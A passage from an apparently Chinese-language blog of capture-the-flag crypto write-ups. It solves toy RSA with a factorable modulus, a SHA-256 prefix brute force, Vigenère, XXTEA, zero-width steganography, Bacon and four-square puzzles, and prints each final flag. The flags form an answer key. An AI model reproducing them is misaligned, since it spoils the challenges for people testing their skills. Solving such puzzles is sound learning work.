class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMAzLFxkrkcYL2wch21CM2kQVFpY9+7+</span><br><span class="line">/AvKr1rzQczdAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></tbody></table></figure><p>从公钥中提取n，c</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">public_key = RSA.importKey(<span class="built_in">open</span>(<span class="string">"1.pem"</span>,<span class="string">"r"</span>).read())</span><br><span class="line"><span class="built_in">print</span>(public_key.n)</span><br><span class="line"><span class="built_in">print</span>(public_key.e)</span><br><span class="line"><span class="comment"># n = 86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br></pre></td></tr></tbody></table></figure><p>n可分解，在线分解</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">p39 = 285960468890451637935629440372639283459</span><br><span class="line">p39 = 304008741604601924494328155975272418463</span><br></pre></td></tr></tbody></table></figure><p>参数足够，上脚本</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c = <span class="number">45625231811262991226691619409422035605300147488561697600920431336997120491388</span></span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p1 = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">p2 = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line"></span><br><span class="line">phi = (p1-<span class="number">1</span>)*(p2-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># 5464648532395214415641566</span></span><br><span class="line"><span class="comment"># b'\x04\x85/0\xc6\xe0\xa7\xcf|\xbb\xde'</span></span><br></pre></td></tr></tbody></table></figure><p>m转md5</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{57f9cc74b768eb1a93f1c3430de9a9d6}</span><br></pre></td></tr></tbody></table></figure><h1 id="七夕特供"><a href="#七夕特供" class="headerlink" title="七夕特供"></a>七夕特供</h1><p>hint.txt</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">寡王小王同学每天七夕的时候都会自觉的选择在家领悟佛法中的真谛，然而随着一年一年过去小王同学对于佛法的理解可以说是倒背如流，于是在2021年七夕前夕，他毅然决然舍弃了自己的韩式欧巴气垫中分纹理烫造型，出家探索佛法中的真谛。</span><br><span class="line">到了寺庙以后，小王同学听到两个僧人之间的对话小王犯了嘀咕：“这俩大哥说的每个字我都知道，咋连在一起我就听不懂了呢？！！！”</span><br><span class="line">一旁的方丈听到小王同学说的话，走过来说：“不知小伙儿可知箴言与否？”小王恍然大悟心里想着“好家伙这年头出家人连讲佛法都要加点盐了？”</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ps:知道大家七夕不容易，给﻿‎‍​﻿‍‌​﻿‎‍​﻿‍‌​‍﻿‌大家送点分。</span><br></pre></td></tr></tbody></table></figure><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">佛曰：楞吉南豆菩诃嚧沙卢伽苏嚧谨他墀罚楞提输度参羯蒙婆悉吉怛喝娑夜尼无俱钵皤哆蒙怛婆俱啰钵夜婆伽摩无阇俱埵那度谨数诃婆菩苏穆吉佛遮耶婆陀摩度诃无唵苏夜悉阇尼萨豆醯羯度埵墀他钵卢那沙那俱喝帝诃迦谨那悉皤佛输伽钵度驮曳驮怛羯钵阇南唎苏羯穆曳地栗舍参栗埵输度谨他苏夜利罚哆陀呼醯栗地唵地咩阿皤度唎啰咩苏蒙钵烁墀佛尼唵埵怛烁哆谨输室摩诃卢地墀哆阿那佛穆遮唵萨尼利阇墀室埵他烁沙提埵驮娑埵数唎婆怛吉无伊阿婆阇写吉呼曳钵帝苏提参夜栗皤萨喝伽阿皤尼醯呼墀醯地参帝尼怛楞舍哆吉孕陀菩墀喝尼陀写谨南耶耶伊栗埵怛参豆提遮参墀伊卢罚卢利他写摩参楞提吉呼俱度伽埵曳婆帝他参罚呼南墀豆豆菩输醯伽墀啰佛娑尼数皤栗萨夜穆皤豆栗蒙啰他耶写舍他俱谨娑菩娑谨菩钵尼俱啰娑羯埵卢室谨摩怛利迦参穆耶提悉利啰佛栗醯耶诃谨烁谨夜嚧楞地啰嚧烁唵阿唎啰遮悉度舍利伊钵吉诃伽无唵埵啰参佛呼伽提诃娑提哆嚧悉摩谨埵曳哆卢喝醯无诃卢那尼啰利参佛夜呼喝帝喝咩俱数输婆穆耶悉卢苏驮写利啰沙尼那埵他蒙阇室娑佛地度驮呼孕尼豆阇豆阇萨摩提写伊卢孕萨驮驮罚伊蒙啰娑烁帝摩沙苏埵嚧俱伊唵钵利苏谨皤哆咩墀啰怛他诃哆度尼数烁输孕羯卢伊皤皤吉楞诃迦帝喝耶写阿啰孕菩谨摩栗摩菩钵数无楞伊南孕苏诃提悉帝喝阿舍卢阿哆栗苏耶皤醯他数南羯谨啰娑哆萨羯佛提悉呼萨写南喝无楞陀怛唎羯遮地呼佛罚伽遮摩埵遮栗那怛卢埵罚萨无俱啰地罚罚驮卢唵室伽无羯烁俱娑蒙钵豆罚蒙喝阿栗吉萨谨烁谨诃遮曳阿佛地南陀陀皤菩埵驮卢苏尼吉诃帝吉羯提醯耶喝吉数曳尼南迦遮写呼楞穆伽醯尼驮曳唵俱呼哆尼豆羯俱耶伊地伊嚧遮罚地阇苏摩咩写罚漫漫</span><br></pre></td></tr></tbody></table></figure><p>佛曰，箴言确定是 与佛论禅 加密，放入文本框发现有隐写字符，用工具看一下</p><p><a href="https://yuanfux.github.io/zero-width-web/">Zero Width Lib (yuanfux.github.io)</a></p><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/image-20231226143812943.png" alt="image-20231226143812943"></p><p>得到内容“gugua”</p><p>在普通的与佛论禅中出不来明文，同时有个key，试试加密的</p><p><a href="https://fy.by950.top/">与佛论禅加密版 (by950.top)</a></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">❃❊❊❂✿❉✼❅✿❉✾✾❀❄✽❀✿❉✾❈❀❆❃❄❁❁✽✾❊❊✾❇✿❉✾❈❁✿✽❉✿❊❀✻✿❉❆❁❊❊✾❇❂❉❉❄✿❊❀✻✻✻❀❁✻✻❀❇✻✻❀✼✻✻❀❂✻✻✿❆✻✻❁✾✻✻❀❄✻✻❀❉✻✻❀❂✻✻✻✼✻✻✻✾✻✻❁❊✻✻❀✼✻✻✻✼✻✻❀❇✻✻❁❊✻✻✿✿✻✻❀❃✻✻✻✾✻✻❁❊✻✻❀✿✻✻❀✼✻✻✿❄✻✻✿❈==</span><br></pre></td></tr></tbody></table></figure><p>得到花，搜一下什么密码</p><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/image-20231226144051512.png" alt="image-20231226144051512"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{Sing13_a1l_th3_day}</span><br></pre></td></tr></tbody></table></figure><h1 id="sha"><a href="#sha" class="headerlink" title="sha"></a>sha</h1><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#sha</span></span><br><span class="line">sha256 = <span class="string">'5875d1b49d1e75478c37cec83534ac477f939578da80b8e317bb2fb1e525ec7a'</span></span><br><span class="line">message = <span class="string">'××××mybabywonder'</span></span><br><span class="line"><span class="built_in">print</span>((<span class="string">'SHA-256(?+{}) == {}'</span>.<span class="built_in">format</span>(message[<span class="number">4</span>:],sha256)))</span><br><span class="line"><span class="comment">#key=?</span></span><br></pre></td></tr></tbody></table></figure><p>常规的hash爆破</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">                src=<span class="built_in">chr</span>(i)+<span class="built_in">chr</span>(j)+<span class="built_in">chr</span>(k)+<span class="built_in">chr</span>(p)+<span class="string">"mybabywonder"</span></span><br><span class="line">                m=hashlib.sha256()</span><br><span class="line">                m.update(src.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                value=m.hexdigest()</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'5875d1b49d1e75478c37cec83534ac477f939578da80b8e317bb2fb1e525ec7a'</span><span class="keyword">in</span> value:</span><br><span class="line">                    <span class="built_in">print</span>(src)</span><br><span class="line"><span class="comment"># nicemybabywonder   </span></span><br></pre></td></tr></tbody></table></figure><p>“XXXX”是“nice”</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">hint：该密码使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式</span><br><span class="line">密文:stck{2pm434d60h8r23nf837e07q88n3ei0qj}</span><br><span class="line">key：××××</span><br></pre></td></tr></tbody></table></figure><p>该密码使用一系列凯撒密码组成密码字母表的加密算法，即维吉尼亚密码</p><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/image-20231226144654851.png" alt="image-20231226144654851"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{2ce434b60d8e23fd837a07d88f3ce0db}</span><br></pre></td></tr></tbody></table></figure><h1 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h1><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span> =<span class="string">javascript</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">utf8to16</span>(<span class="params">str</span>){<span class="keyword">var</span> out,i,len,c;<span class="keyword">var</span> char2,char3;out=[];len=str.<span class="property">length</span>;i=<span class="number">0</span>;<span class="keyword">while</span>(i&lt;len){c=str.<span class="title function_">charCodeAt</span>(i++);<span class="keyword">switch</span>(c&gt;&gt;<span class="number">4</span>)</span></span><br><span class="line"><span class="language-javascript">{<span class="keyword">case</span> <span class="number">0</span>:<span class="keyword">case</span> <span class="number">1</span>:<span class="keyword">case</span> <span class="number">2</span>:<span class="keyword">case</span> <span class="number">3</span>:<span class="keyword">case</span> <span class="number">4</span>:<span class="keyword">case</span> <span class="number">5</span>:<span class="keyword">case</span> <span class="number">6</span>:<span class="keyword">case</span> <span class="number">7</span>:out[out.<span class="property">length</span>]=str.<span class="title function_">charAt</span>(i-<span class="number">1</span>);<span class="keyword">break</span>;<span class="keyword">case</span> <span class="number">12</span>:<span class="keyword">case</span> <span class="number">13</span>:char2=str.<span class="title function_">charCodeAt</span>(i++);out[out.<span class="property">length</span>]=<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(((c&amp;<span class="number">0x1F</span>)&lt;&lt;<span class="number">6</span>)|(char2&amp;<span class="number">0x3F</span>));<span class="keyword">break</span>;<span class="keyword">case</span> <span class="number">14</span>:char2=str.<span class="title function_">charCodeAt</span>(i++);char3=str.<span class="title function_">charCodeAt</span>(i++);out[out.<span class="property">length</span>]=<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(((c&amp;<span class="number">0x0F</span>)&lt;&lt;<span class="number">12</span>)|((char2&amp;<span class="number">0x3F</span>)&lt;&lt;<span class="number">6</span>)|((char3&amp;<span class="number">0x3F</span>)&lt;&lt;<span class="number">0</span>));<span class="keyword">break</span>;}}</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> out.<span class="title function_">join</span>(<span class="string">''</span>);}</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> base64DecodeChars=<span class="keyword">new</span> <span class="title class_">Array</span>(-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,<span class="number">62</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,<span class="number">63</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">54</span>,<span class="number">55</span>,<span class="number">56</span>,<span class="number">57</span>,<span class="number">58</span>,<span class="number">59</span>,<span class="number">60</span>,<span class="number">61</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span>,<span class="number">39</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">44</span>,<span class="number">45</span>,<span class="number">46</span>,<span class="number">47</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">51</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">base64decode</span>(<span class="params">str</span>)</span></span><br><span class="line"><span class="language-javascript">{<span class="keyword">var</span> c1,c2,c3,c4;<span class="keyword">var</span> i,len,out;len=str.<span class="property">length</span>;i=<span class="number">0</span>;out = <span class="string">""</span>;<span class="keyword">while</span>(i&lt;len)</span></span><br><span class="line"><span class="language-javascript">{<span class="keyword">do</span></span></span><br><span class="line"><span class="language-javascript">{c1=base64DecodeChars[str.<span class="title function_">charCodeAt</span>(i++)&amp;<span class="number">0xff</span>]}<span class="keyword">while</span>(i&lt;len&amp;&amp;c1==-<span class="number">1</span>);<span class="keyword">if</span>(c1==-<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">break</span>;<span class="keyword">do</span></span></span><br><span class="line"><span class="language-javascript">{c2=base64DecodeChars[str.<span class="title function_">charCodeAt</span>(i++)&amp;<span class="number">0xff</span>]}<span class="keyword">while</span>(i&lt;len&amp;&amp;c2==-<span class="number">1</span>);<span class="keyword">if</span>(c2==-<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">break</span>;out+=<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((c1&lt;&lt;<span class="number">2</span>)|((c2&amp;<span class="number">0x30</span>)&gt;&gt;<span class="number">4</span>));<span class="keyword">do</span></span></span><br><span class="line"><span class="language-javascript">{c3=str.<span class="title function_">charCodeAt</span>(i++)&amp;<span class="number">0xff</span>;<span class="keyword">if</span>(c3==<span class="number">61</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> out;c3=base64DecodeChars[c3]}<span class="keyword">while</span>(i&lt;len&amp;&amp;c3==-<span class="number">1</span>);<span class="keyword">if</span>(c3==-<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">break</span>;out+=<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(((c2&amp;<span class="number">0XF</span>)&lt;&lt;<span class="number">4</span>)|((c3&amp;<span class="number">0x3C</span>)&gt;&gt;<span class="number">2</span>));<span class="keyword">do</span></span></span><br><span class="line"><span class="language-javascript">{c4=str.<span class="title function_">charCodeAt</span>(i++)&amp;<span class="number">0xff</span>;<span class="keyword">if</span>(c4==<span class="number">61</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> out;c4=base64DecodeChars[c4]}<span class="keyword">while</span>(i&lt;len&amp;&amp;c4==-<span class="number">1</span>);<span class="keyword">if</span>(c4==-<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">break</span>;out+=<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(((c3&amp;<span class="number">0x03</span>)&lt;&lt;<span class="number">6</span>)|c4)}</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> out}</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">long2str</span>(<span class="params">v,w</span>){<span class="keyword">var</span> vl=v.<span class="property">length</span>;<span class="keyword">var</span> sl=v[vl-<span class="number">1</span>]&amp;<span class="number">0xffffffff</span>;<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vl;i++)</span></span><br><span class="line"><span class="language-javascript">{v[i]=<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(v[i]&amp;<span class="number">0xff</span>,v[i]&gt;&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span>,v[i]&gt;&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xff</span>,v[i]&gt;&gt;&gt;<span class="number">24</span>&amp;<span class="number">0xff</span>);}</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span>(w){<span class="keyword">return</span> v.<span class="title function_">join</span>(<span class="string">''</span>).<span class="title function_">substring</span>(<span class="number">0</span>,sl);}</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">else</span>{<span class="keyword">return</span> v.<span class="title function_">join</span>(<span class="string">''</span>);}}</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">str2long</span>(<span class="params">s,w</span>){<span class="keyword">var</span> len=s.<span class="property">length</span>;<span class="keyword">var</span> v=[];<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;len;i+=<span class="number">4</span>)</span></span><br><span class="line"><span class="language-javascript">{v[i&gt;&gt;<span class="number">2</span>]=s.<span class="title function_">charCodeAt</span>(i)|s.<span class="title function_">charCodeAt</span>(i+<span class="number">1</span>)&lt;&lt;<span class="number">8</span>|s.<span class="title function_">charCodeAt</span>(i+<span class="number">2</span>)&lt;&lt;<span class="number">16</span>|s.<span class="title function_">charCodeAt</span>(i+<span class="number">3</span>)&lt;&lt;<span class="number">24</span>;}</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span>(w){v[v.<span class="property">length</span>]=len;}</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> v;}</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">xxtea_decrypt</span>(<span class="params">str,key</span>){<span class="keyword">if</span>(str==<span class="string">""</span>){<span class="keyword">return</span><span class="string">""</span>;}</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> v=<span class="title function_">str2long</span>(str,<span class="literal">false</span>);<span class="keyword">var</span> k=<span class="title function_">str2long</span>(key,<span class="literal">false</span>);<span class="keyword">var</span> n=v.<span class="property">length</span>-<span class="number">1</span>;<span class="keyword">var</span> z=v[n-<span class="number">1</span>],y=v[<span class="number">0</span>],delta=<span class="number">0x9E3779B9</span>;<span class="keyword">var</span> mx,e,q=<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">6</span>+<span class="number">52</span>/(n+<span class="number">1</span>)),sum=q*delta&amp;<span class="number">0xffffffff</span>;<span class="keyword">while</span>(sum!=<span class="number">0</span>){e=sum&gt;&gt;&gt;<span class="number">2</span>&amp;<span class="number">3</span>;<span class="keyword">for</span>(<span class="keyword">var</span> p=n;p&gt;<span class="number">0</span>;p--){z=v[p-<span class="number">1</span>];mx=(z&gt;&gt;&gt;<span class="number">5</span>^y&lt;&lt;<span class="number">2</span>)+(y&gt;&gt;&gt;<span class="number">3</span>^z&lt;&lt;<span class="number">4</span>)^(sum^y)+(k[p&amp;<span class="number">3</span>^e]^z);y=v[p]=v[p]-mx&amp;<span class="number">0xffffffff</span>;}</span></span><br><span class="line"><span class="language-javascript">z=v[n];mx=(z&gt;&gt;&gt;<span class="number">5</span>^y&lt;&lt;<span class="number">2</span>)+(y&gt;&gt;&gt;<span class="number">3</span>^z&lt;&lt;<span class="number">4</span>)^(sum^y)+(k[p&amp;<span class="number">3</span>^e]^z);y=v[<span class="number">0</span>]=v[<span class="number">0</span>]-mx&amp;<span class="number">0xffffffff</span>;sum=sum-delta&amp;<span class="number">0xffffffff</span>;}</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> <span class="title function_">long2str</span>(v,<span class="literal">true</span>);}</span></span><br><span class="line"><span class="language-javascript">t=<span class="string">"pEXJqqycz4ZXXGo7uwNjES1fo/h3qK0krvUnCltz3avOiOsWg8B356EFiH0="</span>;</span></span><br><span class="line"><span class="language-javascript">t=<span class="title function_">utf8to16</span>(<span class="title function_">xxtea_decrypt</span>(<span class="title function_">base64decode</span>(t), <span class="string">'flag'</span>));</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">write</span> (t);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>题目考察xxtea加密，在线工具解</p><p><a href="https://sbox.cn/tool/xxtea">Xxtea在线加密解密 (sbox.cn)</a></p><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/image-20231226145016010.png" alt="image-20231226145016010"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{ddcbda5f6e9e1730b6141dc6310c788a}</span><br></pre></td></tr></tbody></table></figure><h1 id="你知道M型栅栏密码吗？"><a href="#你知道M型栅栏密码吗？" class="headerlink" title="你知道M型栅栏密码吗？"></a>你知道M型栅栏密码吗？</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">H7b D97 B00110111 D57 H37 H67 D55 B00110100 D52 H31 H62 O65 O65 H33 H7d D97 D101 H66 H39 O143 B00110110 D98 H32 H65 O154 O67 B01100100 D98 H36 H30 O67 O145 D53 O146 D51 H61 H61 O145</span><br><span class="line">你知道M型栅栏密码吗?</span><br></pre></td></tr></tbody></table></figure><p>看到这些就知道是进制转换了</p><p>B二进制、O八进制、D十进制、H十六进制</p><p>写脚本跑一下，都变成十进制，转字符</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">text = <span class="string">"H7b D97 B00110111 D57 H37 H67 D55 B00110100 D52 H31 H62 O65 O65 H33 H7d D97 D101 H66 H39 O143 B00110110 D98 H32 H65 O154 O67 B01100100 D98 H36 H30 O67 O145 D53 O146 D51 H61 H61 O145"</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">text2 = text.split(<span class="string">" "</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text2:</span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">"B"</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>(i[<span class="number">1</span>:],<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">'O'</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>(i[<span class="number">1</span>:],<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">'D'</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>(i[<span class="number">1</span>:],<span class="number">10</span>))</span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">'H'</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>(i[<span class="number">1</span>:],<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(result)        </span><br><span class="line"><span class="comment"># {a797g7441b553}aef9c6b2el7db607e5f3aae</span></span><br></pre></td></tr></tbody></table></figure><p>M型栅栏密码，和 神秘组织M一样 </p><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/3167109-20231109023749561-1802853563.png" alt="img"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{7e73df4a49ba6c17b60a7b5952ee5e37}</span><br></pre></td></tr></tbody></table></figure><h1 id="小精灵来喽"><a href="#小精灵来喽" class="headerlink" title="小精灵来喽"></a>小精灵来喽</h1><p>附件为加密的压缩包</p><p>提示：</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">eag'expxwxj</span><br><span class="line">itsme</span><br></pre></td></tr></tbody></table></figure><p>维吉尼亚密码解密，得到”who’stheelf“，可知这就是压缩包的密码</p><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/clip_image002.jpg" alt="img"></p><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/clip_image004.jpg" alt="img"></p><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/clip_image006.jpg" alt="img"></p><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/clip_image008.jpg" alt="img"></p><p>中间无空格</p><p>找到古精灵语对照表</p><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/f7246b600c338744de6d0bcf550fd9f9d62aa0dc" alt="img"></p><p>查表得到herec0mesthee1f ，32位大写MD5</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{08460AE514ACCC54E5D8D4B690A75D29}</span><br></pre></td></tr></tbody></table></figure><h1 id="眼见非实"><a href="#眼见非实" class="headerlink" title="眼见非实"></a>眼见非实</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">1111011111111011000110010101111111110010111011011110000110001101101110101110110111001100011000111100</span><br></pre></td></tr></tbody></table></figure><p>见到后想到的是摩斯密码，但是没有分隔符</p><p>培根密码是A和B混合，尝试用1，0替换，解密得到</p><p>baconiancipherisgood</p><p>md5加密</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{68e5987347d955690d9782edc531ddf3}</span><br></pre></td></tr></tbody></table></figure><h1 id="不一样的四四方方"><a href="#不一样的四四方方" class="headerlink" title="不一样的四四方方"></a>不一样的四四方方</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">请开始你的表演（密文）：jilinjingcha</span><br><span class="line"></span><br><span class="line">注意：正确的密钥后面最后一个字母不要！！！</span><br><span class="line">key1：information</span><br><span class="line">key2：engineering</span><br></pre></td></tr></tbody></table></figure><p>目两个key都给了，但我们需要做下处理。</p><p>首先，去除重复字母并补齐key得到如下矩阵图(正常来说p和q的话只要一个p就行)：</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">key1:informatbcdeghjklpsuvwxyz</span><br><span class="line"></span><br><span class="line">key2:engirabcdfhjklmopstuvwxyz</span><br></pre></td></tr></tbody></table></figure><p>提示说，最后一个字母不要，那就把z去掉</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">key1:informatbcdeghjklpsuvwxy</span><br><span class="line"></span><br><span class="line">key2:engirabcdfhjklmopstuvwxy</span><br></pre></td></tr></tbody></table></figure><p>这样的话就是24位，需要补上q</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">key1:informatbcdeghjklpqsuvwxy</span><br><span class="line"></span><br><span class="line">key2:engirabcdfhjklmopqstuvwxy</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/image-20231226160412162.png" alt="image-20231226160412162"></p><p>转MD5后还是不对，看过wp后发现是加密，666</p><p><img src="/2024/01/08/polard-n-crypto-zhong-deng/image-20231226160940360.png" alt="image-20231226160940360"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span 